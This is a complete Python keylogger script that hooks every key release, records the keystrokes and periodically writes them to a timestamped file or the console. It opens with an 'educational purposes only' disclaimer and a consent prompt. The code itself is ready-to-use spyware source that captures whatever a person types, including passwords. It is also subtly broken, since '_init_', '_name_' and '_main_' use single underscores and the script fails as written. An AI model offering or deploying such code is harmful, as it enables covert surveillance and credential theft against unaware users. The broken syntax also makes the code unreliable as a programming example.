import keyboard  # For key capture
import datetime  # For timestamps
from threading import Timer  # For periodic reporting

class Keylogger:
    def _init_(self, interval=60, report_method="file"):
        """
        Initialize the keylogger
        :param interval: reporting interval in seconds
        :param report_method: how to report logs ("file" or "console")
        """
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.datetime.now()
        self.end_dt = datetime.datetime.now()

    def callback(self, event):
        """
        Called whenever a keyboard event occurs
        """
        name = event.name
        if len(name) > 1:  # Not a character key
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = f"[{name.upper()}]"
        
        self.log += name

    def report_to_file(self):
        """
        Save the log to a file
        """
        filename = f"keylog_{self.start_dt.strftime('%Y-%m-%d_%H-%M-%S')}.txt"
        with open(filename, "w") as f:
            print(self.log, file=f)
        print(f"[+] Saved {filename}")

    def report(self):
        """
        Report the logged keys based on the chosen method
        """
        if self.log:
            self.end_dt = datetime.datetime.now()
            
            if self.report_method == "file":
                self.report_to_file()
            elif self.report_method == "console":
                print(self.log)
            
            self.start_dt = datetime.datetime.now()
        
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        """
        Start the keylogger
        """
        self.start_dt = datetime.datetime.now()
        
        # Hook keyboard events
        keyboard.on_release(callback=self.callback)
        
        # Start reporting
        self.report()
        
        # Block current thread
        print(f"[+] Started keylogger (Reporting every {self.interval} seconds)")
        keyboard.wait()

if _name_ == "_main_":
    # DISCLAIMER
    print("""
    WARNING: This is a keylogger for EDUCATIONAL PURPOSES ONLY.
    Use only on systems you own or have explicit permission to monitor.
    Unauthorized use may violate privacy laws.
    """)
    
    consent = input("Do you understand and accept these terms? (y/n): ").lower()
    if consent != 'y':
        print("Exiting...")
        exit()
    
    # Configuration
    interval = int(input("Enter reporting interval in seconds (default 60): ") or 60)
    method = input("Enter report method (file/console, default file): ").lower() or "file"
    
    # Start keylogger
    keylogger = Keylogger(interval=interval, report_method=method)
    keylogger.start()
